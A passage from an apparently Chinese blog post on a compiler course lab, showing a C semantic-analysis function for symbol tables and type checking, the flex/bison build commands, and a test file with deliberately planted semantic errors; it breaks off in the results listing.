class="keyword">break</span>;</span><br></pre></td></tr></table></figure>
<ul>
<li>最后注意返回该函数的返回类型（为了后续的类型匹配）</li>
</ul>
<p>类型不匹配则要分为以下几种情况：</p>
<ul>
<li>赋值语句类型不匹配（暂时不考虑自动类型转换）</li>
<li>函数调用的参数类型不匹配</li>
<li>函数调用的返回值不匹配</li>
</ul>
<p>详细代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> ASSIGNOP:</span><br><span class="line"><span class="keyword">case</span> OR:</span><br><span class="line"><span class="keyword">case</span> AND:</span><br><span class="line"><span class="keyword">case</span> RELOP:</span><br><span class="line"><span class="keyword">case</span> PLUS:</span><br><span class="line"><span class="keyword">case</span> MINUS:</span><br><span class="line"><span class="keyword">case</span> STAR:</span><br><span class="line"><span class="keyword">case</span> DIV:</span><br><span class="line"><span class="keyword">case</span> COMADD:</span><br><span class="line"><span class="keyword">case</span> COMSUB:</span><br><span class="line">    type1=Semantic_Analysis(T-&gt;ptr[<span class="number">0</span>],type,level,flag,command);</span><br><span class="line">    type2=Semantic_Analysis(T-&gt;ptr[<span class="number">1</span>],type,level,flag,command);</span><br><span class="line">    <span class="keyword">if</span>(type1==type2)</span><br><span class="line">        <span class="keyword">return</span> type1;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;ERROR！第%d行：赋值类型不匹配\n&quot;</span>,T-&gt;pos);</span><br><span class="line">    <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>
<ul>
<li>这里有个小细节需要注意：<code>int a=1;</code> 和 <code>int a; a=1;</code> 是不同的</li>
<li>第一种情况是函数 <code>Semantic_Analysis</code> 执行时，<code>a</code> 没有在符号表中</li>
<li>第二种情况是函数 <code>Semantic_Analysis</code> 执行时，<code>a</code> 已经在符号表中</li>
<li>对于这两种情况都要返回 <code>a</code> 的类型 <code>new_table.symbols[i].type</code></li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> ARGS:</span><br><span class="line">    counter++;</span><br><span class="line">    t=Semantic_Analysis(T-&gt;ptr[<span class="number">0</span>],type,level,flag,command);</span><br><span class="line">    <span class="keyword">if</span>(type!=t)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;ERROR！第%d行：函数调用的第%d个参数类型不匹配\n&quot;</span>,T-&gt;pos,counter);</span><br><span class="line">    type=new_table.symbols[j+counter+<span class="number">1</span>].type;</span><br><span class="line">    Semantic_Analysis(T-&gt;ptr[<span class="number">1</span>],type,level,flag,command);</span><br><span class="line">    <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>
<ul>
<li>函数参数的类型匹配需要借助全局变量 counter 来定位</li>
</ul>
<p><strong>符号表构建</strong></p>
<p>接下来的工作就是针对不同的节点类型来执行对应的操作，主要还是通过递归来遍历 AST 中的各个节点</p>
<p>完整代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Semantic_Analysis</span><span class="params">(struct node* T,<span class="keyword">int</span> type,<span class="keyword">int</span> level,<span class="keyword">char</span> flag,<span class="keyword">int</span> command)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> type1,type2;</span><br><span class="line">    <span class="keyword">if</span>(T)&#123;</span><br><span class="line">        <span class="keyword">switch</span>(T-&gt;kind)&#123;</span><br><span class="line">            <span class="keyword">case</span> EXT_DEF_LIST:</span><br><span class="line">                Semantic_Analysis(T-&gt;ptr[<span class="number">0</span>],type,level,flag,command);</span><br><span class="line">                Semantic_Analysis(T-&gt;ptr[<span class="number">1</span>],type,level,flag,command);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> EXT_VAR_DEF:<span class="comment">//外部变量声明</span></span><br><span class="line">                type=Semantic_Analysis(T-&gt;ptr[<span class="number">0</span>],type,level,flag,command);</span><br><span class="line">                Semantic_Analysis(T-&gt;ptr[<span class="number">1</span>],type,level,flag,command);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> ARRAY_DEF:</span><br><span class="line">                type = Semantic_Analysis(T-&gt;ptr[<span class="number">0</span>],type,level,flag,command);</span><br><span class="line">                Semantic_Analysis(T-&gt;ptr[<span class="number">1</span>],type,level,flag,command);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> ARRAY_DEC:</span><br><span class="line">                flag = <span class="string">&#x27;A&#x27;</span>;<span class="comment">//Array</span></span><br><span class="line">                <span class="built_in">strcpy</span>(new_table.symbols[new_table.index].name,T-&gt;type_id);</span><br><span class="line">                new_table.symbols[new_table.index].level=level;</span><br><span class="line">                new_table.symbols[new_table.index].type=type;</span><br><span class="line">                new_table.symbols[new_table.index].flag=flag;</span><br><span class="line">                new_table.index++;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> TYPE:</span><br><span class="line">                <span class="keyword">return</span> T-&gt;type;</span><br><span class="line">            <span class="keyword">case</span> EXT_DEC_LIST:</span><br><span class="line">                flag=<span class="string">&#x27;V&#x27;</span>;</span><br><span class="line">                Semantic_Analysis(T-&gt;ptr[<span class="number">0</span>],type,level,flag,command);</span><br><span class="line">                Semantic_Analysis(T-&gt;ptr[<span class="number">1</span>],type,level,flag,command);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> ID:<span class="comment">//检测新的变量名是否唯一</span></span><br><span class="line">                i=<span class="number">0</span>;</span><br><span class="line">                <span class="keyword">while</span>(new_table.symbols[i].level!=level&amp;&amp;i&lt;new_table.index)<span class="comment">//转到相同作用域</span></span><br><span class="line">                    i++;</span><br><span class="line">                <span class="keyword">if</span>(command==<span class="number">0</span>)&#123;<span class="comment">//定义变量</span></span><br><span class="line">                    <span class="keyword">while</span>(i&lt;new_table.index)&#123;</span><br><span class="line">                        <span class="keyword">if</span>(<span class="built_in">strcmp</span>(new_table.symbols[i].name,T-&gt;type_id)==<span class="number">0</span> &amp;&amp; new_table.symbols[i].flag==flag)&#123;</span><br><span class="line">                            <span class="keyword">if</span>(flag==<span class="string">&#x27;V&#x27;</span>)</span><br><span class="line">                                <span class="built_in">printf</span>(<span class="string">&quot;ERROR！第%d行：全局变量中出现相同变量名%s\n&quot;</span>,T-&gt;pos,T-&gt;type_id);</span><br><span class="line">                            <span class="keyword">else</span> <span class="keyword">if</span>(flag==<span class="string">&#x27;F&#x27;</span>)</span><br><span class="line">                                <span class="built_in">printf</span>(<span class="string">&quot;ERROR！第%d行：函数定义中出现了相同的函数名%s\n&quot;</span>,T-&gt;pos,T-&gt;type_id);</span><br><span class="line">                            <span class="keyword">else</span> <span class="keyword">if</span>(flag==<span class="string">&#x27;T&#x27;</span>)</span><br><span class="line">                                <span class="built_in">printf</span>(<span class="string">&quot;ERROR！第%d行：局部变量中出现了相同的变量名%s\n&quot;</span>,T-&gt;pos,T-&gt;type_id);</span><br><span class="line">                            <span class="keyword">else</span></span><br><span class="line">                                <span class="built_in">printf</span>(<span class="string">&quot;ERROR！第%d行：函数参数中中出现了相同的变量名%s\n&quot;</span>,T-&gt;pos,T-&gt;type_id);</span><br><span class="line">                            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        i++;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="built_in">strcpy</span>(new_table.symbols[new_table.index].name,T-&gt;type_id);</span><br><span class="line">                    new_table.symbols[new_table.index].level=level;</span><br><span class="line">                    new_table.symbols[new_table.index].type=type;</span><br><span class="line">                    new_table.symbols[new_table.index].flag=flag;</span><br><span class="line">                    new_table.index++;</span><br><span class="line">                    <span class="keyword">return</span> new_table.symbols[i].type;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span>&#123;<span class="comment">//使用变量</span></span><br><span class="line">                    i=new_table.index<span class="number">-1</span>;</span><br><span class="line">                    <span class="keyword">while</span>(i&gt;=<span class="number">0</span>)&#123;</span><br><span class="line">                        <span class="keyword">if</span>(<span class="built_in">strcmp</span>(new_table.symbols[i].name,T-&gt;type_id)==<span class="number">0</span>&amp;&amp;(new_table.symbols[i].flag==<span class="string">&#x27;V&#x27;</span>||new_table.symbols[i].flag==<span class="string">&#x27;T&#x27;</span>||new_table.symbols[i].flag==<span class="string">&#x27;P&#x27;</span>))&#123;</span><br><span class="line">                            <span class="keyword">return</span> new_table.symbols[i].type;</span><br><span class="line">                        &#125;</span><br><span class="line">                        i--;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span>(i&lt;<span class="number">0</span>)&#123;</span><br><span class="line">                        <span class="built_in">printf</span>(<span class="string">&quot;ERROR！第%d行：变量名%s未定义\n&quot;</span>,T-&gt;pos,T-&gt;type_id);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> FUNC_DEF:<span class="comment">//函数声明</span></span><br><span class="line">                type=Semantic_Analysis(T-&gt;ptr[<span class="number">0</span>],type,level+<span class="number">1</span>,flag,command);</span><br><span class="line">                Semantic_Analysis(T-&gt;ptr[<span class="number">1</span>],type,<span class="number">1</span>,flag,command);</span><br><span class="line">                Semantic_Analysis(T-&gt;ptr[<span class="number">2</span>],type,<span class="number">1</span>,flag,command);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> FUNC_DEC:</span><br><span class="line">                <span class="built_in">strcpy</span>(new_table.symbols[new_table.index].name,T-&gt;type_id);</span><br><span class="line">                new_table.symbols[new_table.index].level=<span class="number">0</span>;</span><br><span class="line">                new_table.symbols[new_table.index].type=type;</span><br><span class="line">                new_table.symbols[new_table.index].flag=<span class="string">&#x27;F&#x27;</span>;</span><br><span class="line">                new_table.index++;</span><br><span class="line">                counter=<span class="number">0</span>;</span><br><span class="line">                Semantic_Analysis(T-&gt;ptr[<span class="number">0</span>],type,level,flag,command);<span class="comment">//函数形参</span></span><br><span class="line">                new_table.symbols[new_table.index - counter - <span class="number">1</span>].paramnum=counter;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> PARAM_LIST:</span><br><span class="line">                counter++;</span><br><span class="line">                Semantic_Analysis(T-&gt;ptr[<span class="number">0</span>],type,level,flag,command);</span><br><span class="line">                Semantic_Analysis(T-&gt;ptr[<span class="number">1</span>],type,level,flag,command);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> PARAM_DEC:</span><br><span class="line">                flag=<span class="string">&#x27;P&#x27;</span>;</span><br><span class="line">                type=Semantic_Analysis(T-&gt;ptr[<span class="number">0</span>],type,level+<span class="number">1</span>,flag,command);</span><br><span class="line">                Semantic_Analysis(T-&gt;ptr[<span class="number">1</span>],type,level,flag,command);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> COMP_STM:</span><br><span class="line">                flag=<span class="string">&#x27;T&#x27;</span>;</span><br><span class="line">                command=<span class="number">0</span>;</span><br><span class="line">                new_scope.TX[new_scope.top]=new_table.index;</span><br><span class="line">                new_scope.top++;</span><br><span class="line">                Semantic_Analysis(T-&gt;ptr[<span class="number">0</span>],type,level,flag,command);<span class="comment">//分析定义列表</span></span><br><span class="line">                command=<span class="number">1</span>;</span><br><span class="line">                Semantic_Analysis(T-&gt;ptr[<span class="number">1</span>],type,level+<span class="number">1</span>,flag,command);<span class="comment">//分析语句列表</span></span><br><span class="line">                DisplaySymbolTable();</span><br><span class="line">                new_table.index=new_scope.TX[new_scope.top<span class="number">-1</span>];</span><br><span class="line">                new_scope.top--;</span><br><span class="line">                <span class="keyword">if</span> (new_scope.top == <span class="number">0</span>)</span><br><span class="line">                    DisplaySymbolTable();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> DEF_LIST:</span><br><span class="line">                Semantic_Analysis(T-&gt;ptr[<span class="number">0</span>],type,level,flag,command);</span><br><span class="line">                Semantic_Analysis(T-&gt;ptr[<span class="number">1</span>],type,level,flag,command);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> VAR_DEF:</span><br><span class="line">                type=Semantic_Analysis(T-&gt;ptr[<span class="number">0</span>],type,level+<span class="number">1</span>,flag,command);</span><br><span class="line">                Semantic_Analysis(T-&gt;ptr[<span class="number">1</span>],type,level,flag,command);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> DEC_LIST:</span><br><span class="line">                Semantic_Analysis(T-&gt;ptr[<span class="number">0</span>],type,level,flag,command);</span><br><span class="line">                Semantic_Analysis(T-&gt;ptr[<span class="number">1</span>],type,level,flag,command);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> STM_LIST:</span><br><span class="line">                Semantic_Analysis(T-&gt;ptr[<span class="number">0</span>],type,level,flag,command);<span class="comment">//第一个语句</span></span><br><span class="line">                Semantic_Analysis(T-&gt;ptr[<span class="number">1</span>],type,level,flag,command);<span class="comment">//其他语句</span></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> EXP_STMT:</span><br><span class="line">                Semantic_Analysis(T-&gt;ptr[<span class="number">0</span>],type,level,flag,command);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> RETURN:</span><br><span class="line">                Semantic_Analysis(T-&gt;ptr[<span class="number">0</span>],type,level,flag,command);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> IF_THEN:</span><br><span class="line">            <span class="keyword">case</span> WHILE:</span><br><span class="line">            <span class="keyword">case</span> FOR:</span><br><span class="line">                Semantic_Analysis(T-&gt;ptr[<span class="number">0</span>],type,level,flag,command);</span><br><span class="line">                Semantic_Analysis(T-&gt;ptr[<span class="number">1</span>],type,level,flag,command);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> IF_THEN_ELSE:</span><br><span class="line">                Semantic_Analysis(T-&gt;ptr[<span class="number">0</span>],type,level,flag,command);</span><br><span class="line">                Semantic_Analysis(T-&gt;ptr[<span class="number">1</span>],type,level,flag,command);</span><br><span class="line">                Semantic_Analysis(T-&gt;ptr[<span class="number">2</span>],type,level,flag,command);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> ASSIGNOP:</span><br><span class="line">            <span class="keyword">case</span> OR:</span><br><span class="line">            <span class="keyword">case</span> AND:</span><br><span class="line">            <span class="keyword">case</span> RELOP:</span><br><span class="line">            <span class="keyword">case</span> PLUS:</span><br><span class="line">            <span class="keyword">case</span> MINUS:</span><br><span class="line">            <span class="keyword">case</span> STAR:</span><br><span class="line">            <span class="keyword">case</span> DIV:</span><br><span class="line">            <span class="keyword">case</span> COMADD:</span><br><span class="line">            <span class="keyword">case</span> COMSUB:</span><br><span class="line">                type1=Semantic_Analysis(T-&gt;ptr[<span class="number">0</span>],type,level,flag,command);</span><br><span class="line">                type2=Semantic_Analysis(T-&gt;ptr[<span class="number">1</span>],type,level,flag,command);</span><br><span class="line">                <span class="keyword">if</span>(type1==type2)</span><br><span class="line">                    <span class="keyword">return</span> type1;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;ERROR！第%d行：赋值类型不匹配\n&quot;</span>,T-&gt;pos);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> AUTOADD_L:</span><br><span class="line">            <span class="keyword">case</span> AUTOSUB_L:</span><br><span class="line">            <span class="keyword">case</span> AUTOADD_R:</span><br><span class="line">            <span class="keyword">case</span> AUTOSUB_R:</span><br><span class="line">                Semantic_Analysis(T-&gt;ptr[<span class="number">0</span>],type,level,flag,command);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> INT:</span><br><span class="line">                <span class="keyword">return</span> INT;</span><br><span class="line">            <span class="keyword">case</span> FLOAT:</span><br><span class="line">                <span class="keyword">return</span> FLOAT;</span><br><span class="line">            <span class="keyword">case</span> CHAR:</span><br><span class="line">                <span class="keyword">return</span> CHAR;</span><br><span class="line">            <span class="keyword">case</span> FUNC_CALL:</span><br><span class="line">                j=<span class="number">0</span>;</span><br><span class="line">                <span class="keyword">while</span>(new_table.symbols[j].level==<span class="number">0</span>&amp;&amp;j&lt;new_table.index)&#123;</span><br><span class="line">                    <span class="keyword">if</span>(<span class="built_in">strcmp</span>(new_table.symbols[j].name,T-&gt;type_id)==<span class="number">0</span>)&#123;</span><br><span class="line">                        <span class="keyword">if</span>(new_table.symbols[j].flag!=<span class="string">&#x27;F&#x27;</span>)</span><br><span class="line">                            <span class="built_in">printf</span>(<span class="string">&quot;ERROR！第%d行：函数名%s在符号表中定义为变量\n&quot;</span>,T-&gt;pos,T-&gt;type_id);</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    j++;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(new_table.symbols[j].level==<span class="number">1</span>||j==new_table.index)&#123;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;ERROR！第%d行：函数%s未定义\n&quot;</span>,T-&gt;pos,T-&gt;type_id);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                type=new_table.symbols[j+<span class="number">1</span>].type;</span><br><span class="line">                counter=<span class="number">0</span>;</span><br><span class="line">                Semantic_Analysis(T-&gt;ptr[<span class="number">0</span>],type,level,flag,command);<span class="comment">//分析参数</span></span><br><span class="line">                <span class="keyword">if</span>(new_table.symbols[j].paramnum!=counter)</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;ERROR！第%d行：函数调用%s参数个数不匹配\n&quot;</span>,T-&gt;pos,T-&gt;type_id);</span><br><span class="line">                <span class="keyword">return</span> new_table.symbols[j].type;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> ARGS:</span><br><span class="line">                counter++;</span><br><span class="line">                t=Semantic_Analysis(T-&gt;ptr[<span class="number">0</span>],type,level,flag,command);</span><br><span class="line">                <span class="keyword">if</span>(type!=t)</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;ERROR！第%d行：函数调用的第%d个参数类型不匹配\n&quot;</span>,T-&gt;pos,counter);</span><br><span class="line">                type=new_table.symbols[j+counter+<span class="number">1</span>].type;</span><br><span class="line">                Semantic_Analysis(T-&gt;ptr[<span class="number">1</span>],type,level,flag,command);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>编译与结果</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">flex lexer.l</span><br><span class="line">bison -d -v parser.y </span><br><span class="line">gcc display.c parser.tab.c lex.yy.c -lfl -o test1</span><br></pre></td></tr></table></figure>
<p>测试文件：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> a,b,c;</span><br><span class="line"><span class="keyword">float</span> m,n;</span><br><span class="line"><span class="keyword">char</span> c1,c2;</span><br><span class="line"><span class="keyword">char</span> h[<span class="number">10</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">float</span> a,b;<span class="comment">//全局变量中出现相同变量名</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fibo</span><span class="params">(<span class="keyword">int</span> a)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line">        <span class="keyword">int</span> haha;</span><br><span class="line">	<span class="keyword">if</span>(a == <span class="number">1</span> || a == <span class="number">2</span>)&#123;</span><br><span class="line">	  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">	<span class="keyword">for</span>(i&lt;<span class="number">15</span>)&#123;</span><br><span class="line">          i++;</span><br><span class="line">	&#125;</span><br><span class="line">        </span><br><span class="line">        j = i+<span class="number">1</span>;<span class="comment">//无定义错误</span></span><br><span class="line">        haha(c);<span class="comment">//未定义的函数</span></span><br><span class="line">        a = fibo(<span class="number">1</span>,<span class="number">2</span>);<span class="comment">//参数个数不匹配</span></span><br><span class="line">        b = fibo(m);<span class="comment">//参数类型不匹配</span></span><br><span class="line">	</span><br><span class="line">        <span class="keyword">return</span> fibo(a<span class="number">-1</span>)+fibo(a<span class="number">-2</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">h1</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> a)</span></span>&#123;&#125;<span class="comment">//出现了相同函数参数</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">h2</span><span class="params">()</span></span>&#123;<span class="keyword">int</span> hah; <span class="keyword">float</span> hah;&#125;<span class="comment">//局部变量名出现了相同的变量名</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">float</span> <span class="title">h1</span><span class="params">()</span></span>&#123;&#125;<span class="comment">//重复的函数名</span></span><br></pre></td></tr></table></figure>
<p>最终结果：</p>
<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span 